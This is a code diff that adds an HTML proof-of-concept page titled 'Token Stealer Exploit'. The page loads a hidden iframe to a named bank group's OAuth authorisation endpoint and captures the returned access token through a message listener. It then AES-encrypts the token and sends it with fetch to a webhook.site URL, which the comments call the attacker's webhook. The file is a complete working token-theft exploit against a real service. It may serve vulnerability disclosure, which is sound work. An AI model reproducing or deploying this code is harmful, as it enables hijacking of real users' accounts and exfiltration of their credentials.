@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Token Stealer Exploit</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js" integrity="sha256-H4Ys47aYb9kJ5OkhFYPJSJd+tv6AeyJ0tTkiV6X7zo=" crossorigin="anonymous"></script>
+</head>
+<body>
+    <script>
+        // Add a message event listener to capture the token
+        window.addEventListener("message", function (event) {
+            var token = event.data;
+            alert("Got myself authentication token: " + token);
+            console.log("Received token: " + token);
+            
+            // Encrypt the token with AES
+            var encrypted = CryptoJS.AES.encrypt(token, "Secret Passphrase");
+            console.log("Encrypted token: " + encrypted);
+            
+            // Send the encrypted token to the attacker's webhook
+            var tokenURL = "https://webhook.site/45a5d6ae-fc6b-487d-ac9f-8e263d79564d?data=" + encodeURIComponent(encrypted);
+            fetch(tokenURL);
+        }, false);
+
+        // Function to trigger OAuth page load
+        function hitAuth() {
+            var iframe = document.createElement('iframe');
+            iframe.src = "https://service.authbridge.westpacgroup.com/osp/a/idm/auth/oauth2/grant?response_type=token&client_id=idmdash&redirect_uri=https%3A//service.authbridge.westpacgroup.com/idmdash/oauth";
+            iframe.style.display = "none";
+            document.body.appendChild(iframe);
+        }
+
+        // Trigger OAuth token capture process after 1 second
+        setTimeout(hitAuth, 1000);
+    </script>
+
+    <h3>Token capturing exploit in action</h3>
+</body>
+</html>
